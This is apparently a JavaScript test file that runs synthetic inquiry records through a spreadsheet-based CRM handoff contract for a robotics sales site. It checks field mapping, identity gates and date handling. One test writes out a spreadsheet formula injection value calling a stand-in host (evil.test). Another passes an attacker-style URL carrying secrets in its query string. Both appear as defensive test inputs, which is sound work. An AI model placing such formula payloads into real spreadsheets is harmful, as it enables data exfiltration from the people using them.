'use strict';
/** V129: contract and mapping tests with synthetic records ONLY.
 * This suite never invokes real Apps Script/Sheets/PAI ERP/Gmail/network. */
const {test}=require('node:test');
const assert=require('node:assert/strict');
const fs=require('node:fs');
const path=require('node:path');
const vm=require('node:vm');

const source=fs.readFileSync(path.join(__dirname,'..','ops','inquiry-api','CRM_Handoff_Contract.gs'),'utf8');
const context=vm.createContext({});
vm.runInContext(source,context,{filename:'CRM_Handoff_Contract.gs'});
const prepare=context.evaluateCrmHandoffV129_;
assert.equal(typeof prepare,'function');

const inbox=(overrides={})=>({
 inquiry_id:'INQ-20261103-204500-ABCD1234',
 received_at:'2026-11-03 20:45:00',
 category:'導入条件整理',
 organization:'架空テスト大学',
 name:'テスト研究者',
 email:'researcher@example.test',
 phone:'03-0000-0000',
 product:'Unitree H2 Plus',
 use_case:'Research proof of concept',
 source_page:'https://robotics.air-admin8.co.jp/products/unitree-h2-plus.html',
 source_product:'Unitree H2 Plus',
 source_maker:'Unitree',
 source_service:'',
 server_result:'NOTIFIED',
 submission_token:'submission-test-11',
 ...overrides
});
const existing=(overrides={})=>({
 customerId:'L-TEST-0001',
 primaryEmail:'researcher@example.test',
 name:'テスト研究者',
 affiliation:'架空テスト大学',
 emailStatus:'CONFIRMED',
 emailEvidenceUrl:'https://example.test/official-evidence',
 evidenceGatePassed:true,
 duplicateGatePassed:true,
 conflict:false,
 ...overrides
});
const trusted={personSsoTReadOnlySnapshotVerified:true};
const toPlain=x=>JSON.parse(JSON.stringify(x));

test('V129 S01: physical 17-column target matches existing university 00_新規受付 schema',()=>{
 const plan=prepare(inbox(),[],trusted);
 assert.equal(plan.universityIntake.headers.length,17);
 assert.deepEqual(toPlain(plan.universityIntake.headers),[
  '受付日','データ来源','大学・所属','研究室','研究者名','役職',
  'メール','電話','researchmap_URL','KAKEN_URL','根拠URL',
  '重複確認','顧客ID','処理状態','備考','SourceID','ImportBatchID'
 ]);
 assert.equal(plan.universityIntake.values.length,17);
});

test('V129 S02: source attribution kept but website URL NEVER treated as evidence URL',()=>{
 const p=prepare(inbox(),[],trusted),v=p.universityIntake.values;
 assert.equal(v[0],'2026-11-03');
 assert.equal(v[1],'Robotics_Web_Inquiry');
 assert.equal(v[2],'架空テスト大学');
 assert.equal(v[4],'テスト研究者');
 assert.equal(v[6],'researcher@example.test');
 assert.equal(v[10],'');
 assert.equal(v[11],'未確認');
 assert.equal(v[12],'');
 assert.equal(v[13],'HOLD_EVIDENCE');
 assert(v[14].includes('Product=Unitree H2 Plus'));
 assert(v[14].includes('Source=/products/unitree-h2-plus.html'));
 assert.equal(v[15],inbox().inquiry_id);
 assert.equal(v[16],'');
 assert.equal(p.universityIntake.committed,false);
});

test('V129 S03: same InquiryID deterministic SourceID, no new CustomerID',()=>{
 const a=prepare(inbox(),[],trusted),b=prepare(inbox(),[],trusted);
 assert.equal(a.universityIntake.idempotencyKey,b.universityIntake.idempotencyKey);
 assert.equal(a.identity.customerId,null);
 assert.equal(a.writesPerformed,0);
 assert.equal(a.emailsSent,0);
});

test('V129 S04: university unknown Identity/Evidence leads HOLD, no Primary write',()=>{
 const out=prepare(inbox(),[],trusted);
 assert.equal(out.route,'UNIVERSITY_PERSON');
 assert.equal(out.identity.decision,'NEW_PENDING_VERIFICATION');
 assert.equal(out.identity.reason,'EMAIL_EVIDENCE_REQUIRED');
 assert.equal(out.gate,'HOLD_IDENTITY_GATE');
 assert.equal(out.opportunity.state,'NO_CASE');
});

test('V129 S05: SSOT read not verified means HOLD even when caller supplies matching person',()=>{
 const out=prepare(inbox(),[existing()],{});
 assert.equal(out.identity.decision,'HOLD');
 assert.equal(out.identity.reason,'PERSON_SSOT_NOT_READ');
 assert.equal(out.gate,'HOLD_IDENTITY_GATE');
});

test('V129 S06: verified existing Person may be linked by ID without creating a Case',()=>{
 const out=prepare(inbox(),[existing()],trusted);
 assert.equal(out.identity.decision,'EXISTING_VERIFIED');
 assert.equal(out.identity.customerId,'L-TEST-0001');
 assert.equal(out.opportunity.state,'NO_CASE');
 assert.equal(out.gate,'READY_FOR_EXISTING_WRITER_REVIEW');
 assert.equal(out.writesPerformed,0);
});

test('V129 S07: same email linked to multiple Customer IDs is HOLD',()=>{
 const out=prepare(inbox(),[existing(),existing({customerId:'L-TEST-0002'})],trusted);
 assert.equal(out.identity.reason,'DUPLICATE_EMAIL_MATCH');
 assert.equal(out.opportunity.state,'NO_CASE');
});

test('V129 S08: name or affiliation conflict is HOLD, prevents existing customer overwrite',()=>{
 for(const row of [existing({name:'别的研究者'}),existing({affiliation:'别的大学'})]){
  const result=prepare(inbox(),[row],trusted);
  assert.equal(result.identity.decision,'HOLD');
  assert.equal(result.identity.reason,'PERSON_NAME_OR_AFFILIATION_CONFLICT');
  assert.equal(result.identity.customerId,null);
 }
});

test('V129 S09: self-submitted email is NOT verified Primary without official evidence',()=>{
 for(const row of [existing({emailStatus:'SELF_REPORTED'}),existing({emailEvidenceUrl:''}),existing({customerId:''}),existing({conflict:true})]){
  const out=prepare(inbox(),[row],trusted);
  assert.equal(out.identity.decision,'HOLD');
  assert.equal(out.gate,'HOLD_IDENTITY_GATE');
 }
});

test('V129 S10: corporate visitor must NOT be inserted in university Person Master',()=>{
 for(const organization of ['株式会社テストロボット','Sample Robotics Ltd.']){
  const out=prepare(inbox({organization}),[],trusted);
  assert.equal(out.route,'PAI_ORGANIZATION');
  assert.equal(out.universityIntake,null);
  assert.equal(out.gate,'HOLD_ORGANIZATION_ROUTE');
  assert.equal(out.opportunity.state,'NO_CASE');
 }
});

test('V129 S11: unknown or ambiguous organization HOLD instead of mistaken classification',()=>{
 for(const organization of ['海外研究所','株式会社大学サンプル']){
  const out=prepare(inbox({organization}),[],trusted);
  assert.equal(out.route,'HOLD_UNKNOWN_ENTITY');
  assert.equal(out.universityIntake,null);
  assert.equal(out.gate,'HOLD_ENTITY_CLASSIFICATION');
 }
});

test('V129 S12: quote/PoC need CustomerID; only emit deterministic CaseEvent candidate',()=>{
 for(const [category,type] of [['見積・大学購買','QUOTE_REQUEST'],['PoC設計','POC_CONSULTATION']]){
  const input=inbox({category});
  const hold=prepare(input,[],trusted);
  assert.equal(hold.opportunity.eventType,type);
  assert.equal(hold.opportunity.state,'HOLD_CUSTOMER_ID');
  assert.equal(hold.opportunity.customerId,null);
  const verified=prepare(input,[existing()],trusted);
  assert.equal(verified.opportunity.state,'CASE_EVENT_CANDIDATE_ONLY');
  assert.equal(verified.opportunity.customerId,'L-TEST-0001');
  assert.equal(verified.opportunity.caseEventId,input.inquiry_id+':'+type);
  assert.equal(verified.writesPerformed,0);
 }
});

test('V129 S13: page views, ordinary queries, SDK and product comparison are NOT Case events',()=>{
 for(const category of ['導入条件整理','SDK・ROS・開発環境','製品比較・選定','VLA・模倣学習データ収集','会社・協業相談']){
  const out=prepare(inbox({category,source_service:'poc'}),[existing()],trusted);
  assert.equal(out.opportunity.eventType,null);
  assert.equal(out.opportunity.state,'NO_CASE');
 }
});

test('V129 S14: invalid inquiry ID, email and missing core fields do not create intake',()=>{
 const invalid=[{inquiry_id:'FAKE-001'},{email:'not-an-email'},{organization:''},{name:''},{category:''}];
 for(const item of invalid){
  const out=prepare(inbox(item),[],trusted);
  assert.equal(out.gate,'INVALID_INQUIRY');
  assert.equal(out.universityIntake,null);
  assert.equal(out.followUp.state,'BLOCKED_INVALID_INQUIRY');
 }
});

test('V129 S15: proposal prevents spreadsheet formula injection on person/organization fields',()=>{
 const out=prepare(inbox({organization:'架空テスト大学',name:'=IMPORTXML("https://evil.test","/")'}),[],trusted);
 assert(out.universityIntake.values[4].startsWith("'="));
 assert.equal(out.gate,'HOLD_IDENTITY_GATE');
});

test('V129 S16: no hidden Sheets/API/email/writer side effects in contract',()=>{
 assert(!/\b(?:SpreadsheetApp|MailApp|GmailApp|UrlFetchApp|DriveApp|ScriptApp)\s*\./.test(source));
 assert(!/\b(?:doPost|fetch|appendRow|setValue|sendEmail)\s*\(/.test(source));
 const out=prepare(inbox({category:'見積・大学購買'}),[existing()],trusted);
 assert.equal(out.writesPerformed,0);
 assert.equal(out.emailsSent,0);
 assert.equal(out.followUp.owner,null);
 assert.equal(out.universityIntake.committed,false);
});

test('V129 S17: details in notes never mean verified evidence or marketing consent',()=>{
 const out=prepare(inbox({source_page:'https://robotics.air-admin8.co.jp/some-product',source_maker:'AgiBot'}),[],trusted);
 assert.equal(out.universityIntake.values[10],'');
 assert.equal(out.universityIntake.values[13],'HOLD_EVIDENCE');
 assert.equal(out.identity.customerId,null);
 assert.equal(out.opportunity.state,'NO_CASE');
});

test('V129 S18: entire object declares a pure proposal, not a CRM implementation',()=>{
 const p=prepare(inbox({category:'見積・大学購買'}),[existing()],trusted);
 assert.equal(p.mode,'PURE_CONTRACT_NO_WRITES');
 assert.equal(p.universityIntake.target,'00_新規受付');
 assert.equal(p.opportunity.state,'CASE_EVENT_CANDIDATE_ONLY');
 assert.equal(p.gate,'READY_FOR_EXISTING_WRITER_REVIEW');
 assert.equal(p.writesPerformed,0);
});

test('V129 S19: real Inquiry Date object yields JST 受付日, not a browser locale string',()=>{
 const date=new Date('2026-11-03T16:30:00Z');
 const out=prepare(inbox({received_at:date}),[],trusted);
 assert.equal(out.universityIntake.values[0],'2026-11-04');
});

test('V129 S20: existing Code.gs 27-column mocked Intake receipt joins V129 by its real InquiryID',()=>{
 const code=fs.readFileSync(path.join(__dirname,'..','ops','inquiry-api','Code.gs'),'utf8');
 const ledger=[];
 const sent=[];
 let seq=0;
 const sheet={
   appendRow:items=>{assert.equal(items.length,27);ledger.push(Array.from(items))},
   getLastRow:()=>ledger.length+1,
   getRange:(row,col,count=1,width=1)=>({
     getValues:()=>Array.from({length:count},(_,i)=>Array.from({length:width},(_,j)=>ledger[row+i-2][col+j-1])),
     getValue:()=>ledger[row-2][col-1],
     setValue:v=>{ledger[row-2][col-1]=v}
   })
 };
 const ctx=vm.createContext({
  SpreadsheetApp:{openById:id=>{
   assert.equal(id,'1PzfHiB50jFDHCosMGTb7MUvbQ9nC3UD5pHjgHbpY9Qk');
   return{getSheetByName:name=>{assert.equal(name,'01_Inquiry');return sheet}}
  }},
  Utilities:{getUuid:()=>('ABCD1234-'+String(++seq).padStart(8,'0')),formatDate:()=> '20261103-204500'},
  LockService:{getScriptLock:()=>({waitLock:()=>{},releaseLock:()=>{}})},
  HtmlService:{createHtmlOutput:html=>({html})},
  MailApp:{sendEmail:msg=>sent.push(msg)},
  console:{error:()=>{}},
  Date, JSON, String, Object, Array, Error
 });
 // Replace PROD settings only in a memory-only snapshot. No clasp, no HTTP or actual Sheet.
 const devCode=code.replace('1dgoeLCBJVE0CXBGgizUwA-ozrRVvJw6Ng9gfGN0h8wI',
  '1PzfHiB50jFDHCosMGTb7MUvbQ9nC3UD5pHjgHbpY9Qk');
 assert(!devCode.includes('1dgoeLCBJVE0CXBGgizUwA-ozrRVvJw6Ng9gfGN0h8wI'));
 vm.runInContext(devCode,ctx);
 vm.runInContext(source,ctx);
 const p={
   category:'PoC設計',organization:'架空テスト大学',name:'テスト研究者',
   email:'researcher@example.test',product:'Unitree H2 Plus',use_case:'LAB QA only',
   source_product:'Unitree H2 Plus',source_maker:'Unitree',
   source_page:'https://robotics.air-admin8.co.jp/products/unitree-h2-plus.html',
   submission_token:'synthetic-submission-129',response_token:'synthetic-response',website:''
 };
 const answer=html=>JSON.parse(html.match(/window\.top\.postMessage\((\{.*?\}),/s)[1]);
 const ack1=answer(ctx.doPost({parameter:p}).html);
 assert.equal(ack1.ok,true);
 assert.equal(ledger.length,1);
 const headers=[
  'inquiry_id','received_at','status','category','organization','name','email','phone',
  'product','use_case','budget','schedule','development','message','source_page','source_product',
  'source_maker','source_service','source_theme','source_case','utm_source','utm_medium',
  'utm_campaign','ga_client_id','server_result','notified_at','submission_token'
 ];
 const intake=Object.fromEntries(headers.map((h,i)=>[h,ledger[0][i]]));
 const proposal=ctx.evaluateCrmHandoffV129_(intake,[],{personSsoTReadOnlySnapshotVerified:true});
 assert.equal(proposal.inquiryId,ack1.inquiryId);
 assert.equal(proposal.universityIntake.values[15],ack1.inquiryId);
 assert.equal(proposal.universityIntake.values[10],'');
 assert.equal(proposal.identity.decision,'NEW_PENDING_VERIFICATION');
 assert.equal(proposal.opportunity.state,'HOLD_CUSTOMER_ID');
 assert.equal(proposal.writesPerformed,0);
 const ack2=answer(ctx.doPost({parameter:p}).html);
 assert.equal(ack2.inquiryId,ack1.inquiryId);
 assert.equal(ack2.duplicate,true);
 assert.equal(ledger.length,1);
 assert.equal(sent.length,2); // Only mocked internal/ACK; not an external email.
});

test('V129 S21: Japanese confirmed email status with T006 evidence+dedup passes; 有効 alone does not',()=>{
 for(const state of ['確認済','確認済み','CONFIRMED']){
  const out=prepare(inbox(),[existing({emailStatus:state})],trusted);
  assert.equal(out.identity.decision,'EXISTING_VERIFIED',state);
 }
 for(const state of ['有効','要再調査','未確認','']){
  const out=prepare(inbox(),[existing({emailStatus:state})],trusted);
  assert.equal(out.identity.decision,'HOLD',state);
 }
 for(const x of [existing({evidenceGatePassed:false}),existing({duplicateGatePassed:false})]){
  const out=prepare(inbox(),[x],trusted);
  assert.equal(out.identity.decision,'HOLD');
 }
});

test('V129 S22: source_page is a same-origin path; no attacker query/external referrer is copied into Master note',()=>{
 const a=prepare(inbox({source_page:'https://robotics.air-admin8.co.jp/products/unitree-h2-plus.html?email=secret%40example.test&token=abc'}),[],trusted);
 const note=a.universityIntake.values[14];
 assert(note.includes('Source=/products/unitree-h2-plus.html'));
 assert(!note.includes('secret'));
 assert(!note.includes('?'));
 const b=prepare(inbox({source_page:'https://evil.example.test/?password=sensitive'}),[],trusted);
 const other=b.universityIntake.values[14];
 assert(!other.includes('evil.example'));
 assert(!other.includes('sensitive'));
});

test('V129 S23: project actual 71-column 02_顧客Master physical row through trusted T006 gates',()=>{
 const h=Array.from({length:71},(_,i)=>'RESERVED_'+i),row=Array(71).fill('');
 const cols={
  0:'顧客ID',3:'大学・所属',5:'研究者名',14:'Primaryメール',
  16:'メール状態',17:'メール情報源URL',28:'氏名一致',
  29:'所属一致',33:'営業利用可否',66:'ID状態',68:'メール重複'
 };
 for(const [i,label] of Object.entries(cols))h[Number(i)]=label;
 const set=(key,value)=>{row[h.indexOf(key)]=value};
 set('顧客ID','L-TEST-0001');
 set('大学・所属','架空テスト大学');
 set('研究者名','テスト研究者');
 set('Primaryメール','researcher@example.test');
 set('メール状態','確認済み');
 set('メール情報源URL','https://example.test/evidence');
 set('氏名一致','一致');
 set('所属一致','一致');
 set('営業利用可否','要確認'); // incoming consult != automatic outbound permission
 set('ID状態','OK');
 set('メール重複','OK');
 const fields=context.crmV129PersonFromMasterPhysicalRow_(h,row,{
  officialEmailEvidencePassed:true,identityAndDedupPassed:true
 });
 assert.equal(fields.customerId,'L-TEST-0001');
 assert.equal(fields.emailStatus,'確認済み');
 assert.equal(fields.salesUseAllowed,false);
 assert.equal(fields.duplicateGatePassed,true);
 const out=prepare(inbox(),[fields],trusted);
 assert.equal(out.identity.decision,'EXISTING_VERIFIED');
 assert.equal(out.identity.customerId,'L-TEST-0001');
 assert.equal(out.emailsSent,0);
 assert.equal(out.opportunity.state,'NO_CASE');
 // If physical status changes to 有効, even trusted T006 approvals cannot
 // silently elevate it into a verified Primary for this conservative gate.
 set('メール状態','有効');
 const downgraded=context.crmV129PersonFromMasterPhysicalRow_(h,row,{officialEmailEvidencePassed:true,identityAndDedupPassed:true});
 assert.equal(prepare(inbox(),[downgraded],trusted).identity.decision,'HOLD');
});

test('V129 S24: missing physical columns or duplicate field names fail closed',()=>{
 const h=Array.from({length:71},(_,i)=>'RESERVED_'+i);
 const row=Array(71).fill('');
 assert.equal(context.crmV129PersonFromMasterPhysicalRow_(h,row,{}),null);
 assert.equal(context.crmV129PersonFromMasterPhysicalRow_(['顧客ID'],['L-TEST-0001'],{}),null);
 const x=prepare(inbox(),[null],trusted);
 assert.equal(x.identity.reason,'PERSON_SSOT_ROW_INVALID');
 assert.equal(x.gate,'HOLD_IDENTITY_GATE');
});


test('V129 S25: Date, UTC and explicit-offset representations of one instant have identical JST date',()=>{
 const values=[new Date('2026-11-03T16:30:00Z'),'2026-11-03T16:30:00Z','2026-11-04T01:30:00+09:00','2026-11-03T11:30:00-05:00'];
 for(const received_at of values){
  assert.equal(prepare(inbox({received_at}),[],trusted).universityIntake.values[0],'2026-11-04');
 }
 assert.equal(context.crmV129JstDate_('2026-12-31T15:00:00.001Z'),'2027-01-01');
 assert.equal(context.crmV129JstDate_('2026-11-04T00:30:00+14:00'),'2026-11-03');
});

test('V129 S26: rollover dates, invalid times, offsets and trailing data fail closed',()=>{
 const invalid=['2026-02-30','2026-02-29','1900-02-29','2026-04-31','2026-00-03','2026-13-03','2026-11-00','0000-01-01','2026-11-03junk','2026-11-03 24:00:00','2026-11-03T23:60:00Z','2026-11-03T23:00:60Z','2026-11-03T20:45:00+24:00','2026-11-03T20:45:00+09:60','2026-11-03T20:45:00Z-extra','2026-11-03'+(' '.repeat(80))+'junk'];
 for(const received_at of invalid){
  assert.equal(context.crmV129JstDate_(received_at),'',received_at);
  const out=prepare(inbox({received_at}),[existing()],trusted);
  assert.equal(out.gate,'INVALID_INQUIRY',received_at);
  assert.equal(out.universityIntake,null);
  assert.equal(out.opportunity.state,'NO_CASE');
 }
});

test('V129 S27: existing JST Sheet display values and real leap dates remain compatible',()=>{
 for(const [received_at,want] of [['2026-11-03','2026-11-03'],['2026-11-03 20:45:00','2026-11-03'],['2026-11-03T20:45:00','2026-11-03'],['2026-11-03 20:45:00.12','2026-11-03'],['2000-02-29','2000-02-29'],['2028-02-29','2028-02-29'],['0001-01-01','0001-01-01']]){
  assert.equal(context.crmV129JstDate_(received_at),want,received_at);
 }
});

test('V129 S28: invalid, extreme and spoofed Date inputs never throw or yield an intake row',()=>{
 const invalid=[new Date(NaN),new Date(8640000000000000),new Date(-8640000000000000),null,undefined,0,{},'',{[Symbol.toStringTag]:'Date',getTime:()=>0}];
 for(const received_at of invalid){
  assert.doesNotThrow(()=>context.crmV129JstDate_(received_at));
  assert.equal(context.crmV129JstDate_(received_at),'');
  const out=prepare(inbox({received_at,category:'PoC設計'}),[existing()],trusted);
  assert.equal(out.gate,'INVALID_INQUIRY');
  assert.equal(out.universityIntake,null);
  assert.equal(out.opportunity.state,'NO_CASE');
  assert.equal(out.writesPerformed,0);
 }
});

test('V129 S29: JST midnight boundary and leap-year UTC rollover are exact',()=>{
 for(const [received_at,want] of [['2026-11-03T14:59:59.999Z','2026-11-03'],['2026-11-03T15:00:00Z','2026-11-04'],['2028-02-28T15:00:00Z','2028-02-29'],['2028-02-29T15:00:00Z','2028-03-01']]){
  assert.equal(context.crmV129JstDate_(received_at),want);
 }
});

test('V129 S30: invalid receipt time cannot emit even a quote CaseEvent candidate',()=>{
 const out=prepare(inbox({received_at:'2026-02-30',category:'見積・大学購買'}),[existing()],trusted);
 assert.equal(out.identity.customerId,null);
 assert.equal(out.opportunity.caseEventId,null);
 assert.equal(out.followUp.state,'BLOCKED_INVALID_INQUIRY');
 assert.equal(out.emailsSent,0);
});


// P0: Corporate PAI accepts InboundIntakeRef before SalesCaseID and does
// NOT require a university researcher L-xxxx CustomerID.
test('V129 S31: corporate quote/PoC must not require university Person CustomerID',()=>{
  for(const [category,eventType] of [['見積・大学購買','QUOTE_REQUEST'],['PoC設計','POC_CONSULTATION']]){
    const i=inbox({organization:'株式会社テスト企業',email:'contact@example.test',category});
    const out=prepare(i,[],trusted);
    assert.equal(out.route,'PAI_ORGANIZATION');
    assert.equal(out.inboundIntakeRef,i.inquiry_id);
    assert.equal(out.gate,'HOLD_ORGANIZATION_ROUTE');
    assert.equal(out.universityIntake,null);
    assert.equal(out.identity.customerId,null);
    assert.equal(out.opportunity.customerId,null);
    assert.equal(out.opportunity.eventType,eventType);
    assert.equal(out.opportunity.caseEventId,i.inquiry_id+':'+eventType);
    assert.equal(out.opportunity.state,'HOLD_PAI_CORPORATE_EVIDENCE_AND_WRITER');
    assert.equal(out.writesPerformed,0);
    assert.equal(out.emailsSent,0);
  }
});
test('V129 S32: ordinary corporate web inquiries never create Case or university Person',()=>{
  for(const [org,category] of [
    ['株式会社ユニキャスト','製品比較・選定'],
    ['株式会社みどりホールディングス','会社・協業相談']
  ]){
    const i=inbox({organization:org,category,email:'safe-synthetic@example.test'});
    const first=prepare(i,[],trusted),retry=prepare(i,[],trusted);
    assert.equal(first.route,'PAI_ORGANIZATION');
    assert.equal(first.universityIntake,null);
    assert.equal(first.opportunity.state,'NO_CASE');
    assert.equal(first.opportunity.caseEventId,null);
    assert.equal(first.inboundIntakeRef,retry.inboundIntakeRef);
    assert.equal(first.writesPerformed,0);
    assert.equal(retry.writesPerformed,0);
  }
});
test('V129 S33: ambiguous entity quote holds without any Person/Case writer',()=>{
  const i=inbox({organization:'株式会社大学サンプル',category:'PoC設計'});
  const out=prepare(i,[],trusted);
  assert.equal(out.route,'HOLD_UNKNOWN_ENTITY');
  assert.equal(out.gate,'HOLD_ENTITY_CLASSIFICATION');
  assert.equal(out.universityIntake,null);
  assert.equal(out.opportunity.state,'HOLD_ENTITY_CLASSIFICATION');
  assert.equal(out.opportunity.customerId,null);
  assert.equal(out.writesPerformed,0);
});
